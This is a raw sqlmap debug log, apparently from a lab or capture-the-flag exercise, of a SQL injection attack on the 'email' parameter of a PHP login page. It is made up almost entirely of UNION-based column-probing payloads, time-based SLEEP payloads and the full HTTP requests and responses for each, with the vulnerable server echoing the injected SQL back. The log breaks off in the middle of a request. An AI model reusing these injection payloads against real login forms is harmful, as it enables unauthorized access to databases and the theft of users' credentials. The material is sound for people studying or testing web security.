Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-8174%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x4d41545479685277514b%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-8174' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x4d41545479685277514b,0x7176766b71),NULL-- -'"
    ]
}
[03:42:30] [PAYLOAD] -8939' UNION ALL SELECT CONCAT(0x7176766b71,0x446b75544f6d65665450,0x7176766b71),NULL,NULL,NULL-- -
[03:42:30] [TRAFFIC OUT] HTTP request [#131]:
GET /ai/includes/user_login.php?email=-8939%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x446b75544f6d65665450%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:30] [TRAFFIC IN] HTTP response [#131] (200 OK):
Date: Sun, 19 Oct 2025 07:42:30 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-8939%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x446b75544f6d65665450%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-8939' UNION ALL SELECT CONCAT(0x7176766b71,0x446b75544f6d65665450,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[03:42:32] [PAYLOAD] test@chatai.com' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x714b79457a536e5549464959436279415367534156526f6a58424c4d597651416a52734f47647558,0x7176766b71)-- -
[03:42:32] [TRAFFIC OUT] HTTP request [#132]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x714b79457a536e5549464959436279415367534156526f6a58424c4d597651416a52734f47647558%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#132] (200 OK):
Date: Sun, 19 Oct 2025 07:42:32 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x714b79457a536e5549464959436279415367534156526f6a58424c4d597651416a52734f47647558%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x714b79457a536e5549464959436279415367534156526f6a58424c4d597651416a52734f47647558,0x7176766b71)-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x70486148616c4a574845664e4a6a6a755266464d704c4d634377677a7561536e64456a694c787a69,0x7176766b71),30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#133]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x70486148616c4a574845664e4a6a6a755266464d704c4d634377677a7561536e64456a694c787a69%2C0x7176766b71%29%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#133] (200 OK):
Date: Sun, 19 Oct 2025 07:42:32 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x70486148616c4a574845664e4a6a6a755266464d704c4d634377677a7561536e64456a694c787a69%2C0x7176766b71%29%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x70486148616c4a574845664e4a6a6a755266464d704c4d634377677a7561536e64456a694c787a69,0x7176766b71),30-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x6a516572464351675579746c69616f586e696c716158446242456d54717861657943666451496851,0x7176766b71),30,30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#134]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x6a516572464351675579746c69616f586e696c716158446242456d54717861657943666451496851%2C0x7176766b71%29%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#134] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x6a516572464351675579746c69616f586e696c716158446242456d54717861657943666451496851%2C0x7176766b71%29%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x6a516572464351675579746c69616f586e696c716158446242456d54717861657943666451496851,0x7176766b71),30,30-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x4f526a6447625a46755a7747624e6b486e7549725a7552594e696c4c64786a48794b476644466b4d,0x7176766b71),30,30,30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#135]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4f526a6447625a46755a7747624e6b486e7549725a7552594e696c4c64786a48794b476644466b4d%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#135] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 259
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4f526a6447625a46755a7747624e6b486e7549725a7552594e696c4c64786a48794b476644466b4d%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x4f526a6447625a46755a7747624e6b486e7549725a7552594e696c4c64786a48794b476644466b4d,0x7176766b71),30,30,30-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x5866464c4a4674664a50,0x7176766b71)-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#136]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x5866464c4a4674664a50%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#136] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x5866464c4a4674664a50%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x5866464c4a4674664a50,0x7176766b71)-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x71625a717956674e6750,0x7176766b71),30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#137]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x71625a717956674e6750%2C0x7176766b71%29%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#137] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x71625a717956674e6750%2C0x7176766b71%29%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x71625a717956674e6750,0x7176766b71),30-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x68514f78434354455569,0x7176766b71),30,30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#138]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x68514f78434354455569%2C0x7176766b71%29%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#138] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x68514f78434354455569%2C0x7176766b71%29%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x68514f78434354455569,0x7176766b71),30,30-- -'"
    ]
}
[03:42:33] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x7a66684365664741525a,0x7176766b71),30,30,30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#139]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x7a66684365664741525a%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#139] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 199
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x7a66684365664741525a%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x7a66684365664741525a,0x7176766b71),30,30,30-- -'"
    ]
}
[03:42:33] [PAYLOAD] -6812' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x69617756664e62704d5a697a59557257735850504558666a7952634c6f4c47426951794f6a6d706a,0x7176766b71),30,30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#140]:
GET /ai/includes/user_login.php?email=-6812%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x69617756664e62704d5a697a59557257735850504558666a7952634c6f4c47426951794f6a6d706a%2C0x7176766b71%29%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:33] [TRAFFIC IN] HTTP response [#140] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-6812%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x69617756664e62704d5a697a59557257735850504558666a7952634c6f4c47426951794f6a6d706a%2C0x7176766b71%29%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-6812' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x69617756664e62704d5a697a59557257735850504558666a7952634c6f4c47426951794f6a6d706a,0x7176766b71),30,30-- -'"
    ]
}
[03:42:33] [PAYLOAD] -6134' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x78777943427565634a58644e6942454c46676d5775635452716a61766b614e6c686165515245556d,0x7176766b71),30-- -
[03:42:33] [TRAFFIC OUT] HTTP request [#141]:
GET /ai/includes/user_login.php?email=-6134%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x78777943427565634a58644e6942454c46676d5775635452716a61766b614e6c686165515245556d%2C0x7176766b71%29%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#141] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-6134%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x78777943427565634a58644e6942454c46676d5775635452716a61766b614e6c686165515245556d%2C0x7176766b71%29%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-6134' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x78777943427565634a58644e6942454c46676d5775635452716a61766b614e6c686165515245556d,0x7176766b71),30-- -'"
    ]
}
[03:42:34] [PAYLOAD] -6259' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x7852504b46486a6a765849526268564a55556d7872716a695041765a69675170434162484e674d68,0x7176766b71)-- -
[03:42:34] [TRAFFIC OUT] HTTP request [#142]:
GET /ai/includes/user_login.php?email=-6259%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x7852504b46486a6a765849526268564a55556d7872716a695041765a69675170434162484e674d68%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#142] (200 OK):
Date: Sun, 19 Oct 2025 07:42:33 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-6259%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x7852504b46486a6a765849526268564a55556d7872716a695041765a69675170434162484e674d68%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-6259' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x7852504b46486a6a765849526268564a55556d7872716a695041765a69675170434162484e674d68,0x7176766b71)-- -'"
    ]
}
[03:42:34] [PAYLOAD] -5267' UNION ALL SELECT CONCAT(0x7176766b71,0x6e48586966435255795661514f58475a5151415876526653624676736e4859615a6f544e556c6b6e,0x7176766b71),30,30,30-- -
[03:42:34] [TRAFFIC OUT] HTTP request [#143]:
GET /ai/includes/user_login.php?email=-5267%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x6e48586966435255795661514f58475a5151415876526653624676736e4859615a6f544e556c6b6e%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#143] (200 OK):
Date: Sun, 19 Oct 2025 07:42:34 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 249
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-5267%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x6e48586966435255795661514f58475a5151415876526653624676736e4859615a6f544e556c6b6e%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-5267' UNION ALL SELECT CONCAT(0x7176766b71,0x6e48586966435255795661514f58475a5151415876526653624676736e4859615a6f544e556c6b6e,0x7176766b71),30,30,30-- -'"
    ]
}
[03:42:34] [PAYLOAD] -8033' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x74736d79725a72656472,0x7176766b71),30,30-- -
[03:42:34] [TRAFFIC OUT] HTTP request [#144]:
GET /ai/includes/user_login.php?email=-8033%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x74736d79725a72656472%2C0x7176766b71%29%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#144] (200 OK):
Date: Sun, 19 Oct 2025 07:42:34 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-8033%27%20UNION%20ALL%20SELECT%2030%2CCONCAT%280x7176766b71%2C0x74736d79725a72656472%2C0x7176766b71%29%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-8033' UNION ALL SELECT 30,CONCAT(0x7176766b71,0x74736d79725a72656472,0x7176766b71),30,30-- -'"
    ]
}
[03:42:34] [PAYLOAD] -3124' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x54444f6941586261776f,0x7176766b71),30-- -
[03:42:34] [TRAFFIC OUT] HTTP request [#145]:
GET /ai/includes/user_login.php?email=-3124%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x54444f6941586261776f%2C0x7176766b71%29%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#145] (200 OK):
Date: Sun, 19 Oct 2025 07:42:34 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3124%27%20UNION%20ALL%20SELECT%2030%2C30%2CCONCAT%280x7176766b71%2C0x54444f6941586261776f%2C0x7176766b71%29%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3124' UNION ALL SELECT 30,30,CONCAT(0x7176766b71,0x54444f6941586261776f,0x7176766b71),30-- -'"
    ]
}
[03:42:34] [PAYLOAD] -9997' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x6551566369725561686c,0x7176766b71)-- -
[03:42:34] [TRAFFIC OUT] HTTP request [#146]:
GET /ai/includes/user_login.php?email=-9997%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x6551566369725561686c%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#146] (200 OK):
Date: Sun, 19 Oct 2025 07:42:34 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-9997%27%20UNION%20ALL%20SELECT%2030%2C30%2C30%2CCONCAT%280x7176766b71%2C0x6551566369725561686c%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-9997' UNION ALL SELECT 30,30,30,CONCAT(0x7176766b71,0x6551566369725561686c,0x7176766b71)-- -'"
    ]
}
[03:42:34] [PAYLOAD] -3483' UNION ALL SELECT CONCAT(0x7176766b71,0x5a6e6879454e56794845,0x7176766b71),30,30,30-- -
[03:42:34] [TRAFFIC OUT] HTTP request [#147]:
GET /ai/includes/user_login.php?email=-3483%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x5a6e6879454e56794845%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:34] [TRAFFIC IN] HTTP response [#147] (200 OK):
Date: Sun, 19 Oct 2025 07:42:34 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3483%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x5a6e6879454e56794845%2C0x7176766b71%29%2C30%2C30%2C30--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3483' UNION ALL SELECT CONCAT(0x7176766b71,0x5a6e6879454e56794845,0x7176766b71),30,30,30-- -'"
    ]
}
[03:42:34] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 20 columns' because the level (3) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (30) - 21 to 40 columns' because the level (2) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 40 columns' because the level (2) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 40 columns' because the level (3) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (60) - 41 to 60 columns' because the level (3) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 60 columns' because the level (3) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 60 columns' because the level (4) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (30) - 61 to 80 columns' because the level (4) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (NULL) - 61 to 80 columns' because the level (4) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (random number) - 61 to 80 columns' because the level (5) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (30) - 81 to 100 columns' because the level (5) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (NULL) - 81 to 100 columns' because the level (5) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'Generic UNION query (random number) - 81 to 100 columns' because the level (5) is higher than the provided (1)
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (30) - 1 to 20 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 20 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 20 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (30) - 21 to 40 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 40 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 40 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (60) - 41 to 60 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 60 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 60 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (30) - 61 to 80 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (NULL) - 61 to 80 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (random number) - 61 to 80 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (30) - 81 to 100 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (NULL) - 81 to 100 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [DEBUG] skipping test 'MySQL UNION query (random number) - 81 to 100 columns' because the heuristic tests showed that the back-end DBMS could be 'None'
[03:42:34] [INFO] checking if the injection point on GET parameter 'email' is a false positive
[03:42:34] [PAYLOAD] test@chatai.com' AND (SELECT 6610 FROM (SELECT(SLEEP(5-(IF(36=36,0,5)))))VIdp) AND 'ISHW'='ISHW
[03:42:34] [TRAFFIC OUT] HTTP request [#148]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%206610%20FROM%20%28SELECT%28SLEEP%285-%28IF%2836%3D36%2C0%2C5%29%29%29%29%29VIdp%29%20AND%20%27ISHW%27%3D%27ISHW&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:44] [TRAFFIC IN] HTTP response [#148] (200 OK):
Date: Sun, 19 Oct 2025 07:42:34 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 191
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%206610%20FROM%20%28SELECT%28SLEEP%285-%28IF%2836%3D36%2C0%2C5%29%29%29%29%29VIdp%29%20AND%20%27ISHW%27%3D%27ISHW&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 6610 FROM (SELECT(SLEEP(5-(IF(36=36,0,5)))))VIdp) AND 'ISHW'='ISHW'"
    ]
}
[03:42:44] [PAYLOAD] test@chatai.com' AND (SELECT 3721 FROM (SELECT(SLEEP(5-(IF(36=71,0,5)))))wXST) AND 'nuXq'='nuXq
[03:42:44] [TRAFFIC OUT] HTTP request [#149]:
